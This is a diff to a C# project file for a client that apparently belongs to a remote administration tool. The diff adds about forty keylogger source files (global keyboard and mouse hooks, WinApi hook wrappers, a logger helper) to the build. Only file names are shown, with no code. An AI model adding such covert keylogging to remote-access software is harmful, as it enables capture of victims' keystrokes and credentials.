@@ -70,6 +70,47 @@
     <Compile Include="Core\Information\OSInfo.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
+    <Compile Include="Core\Keylogger\Hook.cs" />
+    <Compile Include="Core\Keylogger\HotKeys\HotKeyArgs.cs" />
+    <Compile Include="Core\Keylogger\HotKeys\HotKeySet.cs" />
+    <Compile Include="Core\Keylogger\HotKeys\HotKeySetCollection.cs" />
+    <Compile Include="Core\Keylogger\HotKeys\HotKeySetsListener.cs" />
+    <Compile Include="Core\Keylogger\IKeyboardEvents.cs" />
+    <Compile Include="Core\Keylogger\IKeyboardMouseEvents.cs" />
+    <Compile Include="Core\Keylogger\IMouseEvents.cs" />
+    <Compile Include="Core\Keylogger\Implementation\AppEventFacade.cs" />
+    <Compile Include="Core\Keylogger\Implementation\AppKeyListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\AppMouseListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\BaseListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\ButtonSet.cs" />
+    <Compile Include="Core\Keylogger\Implementation\Callback.cs" />
+    <Compile Include="Core\Keylogger\Implementation\EventFacade.cs" />
+    <Compile Include="Core\Keylogger\Implementation\GlobalEventFacade.cs" />
+    <Compile Include="Core\Keylogger\Implementation\GlobalKeyListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\GlobalMouseListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\KeyboardState.cs" />
+    <Compile Include="Core\Keylogger\Implementation\KeyListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\MouseListener.cs" />
+    <Compile Include="Core\Keylogger\Implementation\Subscribe.cs" />
+    <Compile Include="Core\Keylogger\KeyEventArgsExt.cs" />
+    <Compile Include="Core\Keylogger\KeyPressEventArgsExt.cs" />
+    <Compile Include="Core\Keylogger\LoggerHelper.cs" />
+    <Compile Include="Core\Keylogger\MouseEventExtArgs.cs" />
+    <Compile Include="Core\Keylogger\WinApi\AppMouseStruct.cs" />
+    <Compile Include="Core\Keylogger\WinApi\CallbackData.cs" />
+    <Compile Include="Core\Keylogger\WinApi\HookHelper.cs" />
+    <Compile Include="Core\Keylogger\WinApi\HookIds.cs" />
+    <Compile Include="Core\Keylogger\WinApi\HookNativeMethods.cs" />
+    <Compile Include="Core\Keylogger\WinApi\HookProcedure.cs" />
+    <Compile Include="Core\Keylogger\WinApi\HookProcedureHandle.cs" />
+    <Compile Include="Core\Keylogger\WinApi\HookResult.cs" />
+    <Compile Include="Core\Keylogger\WinApi\KeyboardHookStruct.cs" />
+    <Compile Include="Core\Keylogger\WinApi\KeyboardNativeMethods.cs" />
+    <Compile Include="Core\Keylogger\WinApi\Messages.cs" />
+    <Compile Include="Core\Keylogger\WinApi\MouseNativeMethods.cs" />
+    <Compile Include="Core\Keylogger\WinApi\MouseStruct.cs" />
+    <Compile Include="Core\Keylogger\WinApi\Point.cs" />
+    <Compile Include="Core\Keylogger\WinApi\ThreadNativeMethods.cs" />
     <Compile Include="Core\Packets\ClientPackets\DesktopResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DirectoryResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DownloadFileResponse.cs" />
@@ -233,7 +274,9 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
   </ItemGroup>
-  <ItemGroup />
+  <ItemGroup>
+    <Content Include="Core\Keylogger\HotKeys\ReadMe.txt" />
+  </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent>copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
